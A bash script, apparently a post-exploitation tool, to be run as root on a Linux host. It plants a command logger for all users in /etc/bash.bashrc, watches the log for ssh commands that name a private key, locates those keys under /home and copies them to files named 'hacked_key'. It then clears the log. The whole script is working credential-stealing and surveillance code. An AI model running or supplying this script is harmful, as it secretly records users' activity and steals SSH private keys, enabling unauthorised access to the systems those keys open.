#!/bin/bash

#Script Overview: Run as root to configure command logging for all users. Then Monitor the log file for ssh client command utilizing a key > if found extract the key

#Tested On: Debian 11

# define the command which will log terminal commands for all users into /var/log/debug
PROMPT_COMMAND='RETRN_VAL=$?;logger -p local6.debug "$(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" )"'

# append the command to the file /etc/bash.bashrc
echo "$PROMPT_COMMAND" | sudo tee -a /etc/bash.bashrc

# sleep for 5 seconds
sleep 5;

#Forever loop
while true
do

  # loop through each line in the /var/log/debug file
  while read line
  do

    # check if the line contains the pattern
    if echo "$line" | grep -q 'ssh.*-i'
    then

      # extract the username who ran the command
      username=$(echo "$line" | cut -d ']' -f 2 | cut -d '-' -f 2 | cut -d ' ' -f 2)
      keyname=$(echo "$line" | cut -d ']' -f 2 | cut -d '-' -f 3 |cut -d ' ' -f 2)

      findname=$(find /home/ -name "$keyname")

      # perform Data exfiltration on found key
      exfiltratekey=$(cp "$findname" /var/log/hacked_key_$((1 + $RANDOM % 10)).txt)

      # clear the log file to reduce duplicate findings
      echo ' ' > /var/log/debug

    fi
  done < /var/log/debug

  sleep 60  # wait for 60 seconds before checking debug file again
done